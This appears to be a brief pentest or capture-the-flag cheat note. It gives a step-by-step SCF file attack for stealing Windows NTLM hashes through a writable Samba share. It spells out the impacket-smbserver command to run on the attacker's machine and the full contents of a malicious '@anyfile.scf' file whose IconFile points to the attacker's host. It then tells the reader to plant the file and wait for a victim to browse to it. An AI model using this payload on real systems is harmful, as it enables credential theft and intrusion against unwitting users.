Step 1: Connect to the target's samba share and find somewhere you can upload files to (preferably '\Users\Public\'.
Step 2: On your box, do 'sudo impacket-smbserver -smb2support <share> ./'
Step 3: On your own box, make a file '@anyfile.scf' and enter the following:
	[Shell]
	Command=2
	IconFile=\\<yourIP>\<share>\
	[Taskbar]
	Command=ToggleDesktop

Step 3: Upload '@anyfile.scf' to a folder on the target's samba share.
Step 4: Wait for a user to open the file and you get their hash.
